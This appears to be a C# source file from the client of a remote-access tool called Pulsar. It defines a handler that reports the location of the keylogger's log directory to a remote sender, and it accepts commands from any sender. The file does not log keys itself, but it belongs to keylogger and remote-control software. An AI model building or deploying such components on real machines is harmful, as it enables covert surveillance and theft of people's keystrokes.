using Pulsar.Client.Config;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Monitoring.KeyLogger;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using System.IO;

namespace Pulsar.Client.Messages
{
    public class KeyloggerHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) =>
            message is GetKeyloggerLogsDirectory;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetKeyloggerLogsDirectory msg:
                    Execute(sender, msg);
                    break;
            }
        }

        public void Execute(ISender client, GetKeyloggerLogsDirectory message)
        {
            string path = Settings.LOGSPATH;

            // 🔥 FIX — if directory does NOT exist, send NULL (no error)
            if (!Directory.Exists(path))
            {
                client.Send(new GetKeyloggerLogsDirectoryResponse
                {
                    LogsDirectory = null
                });
                return;
            }

            // ✔ directory exists → return it
            client.Send(new GetKeyloggerLogsDirectoryResponse
            {
                LogsDirectory = path
            });
        }
    }
}
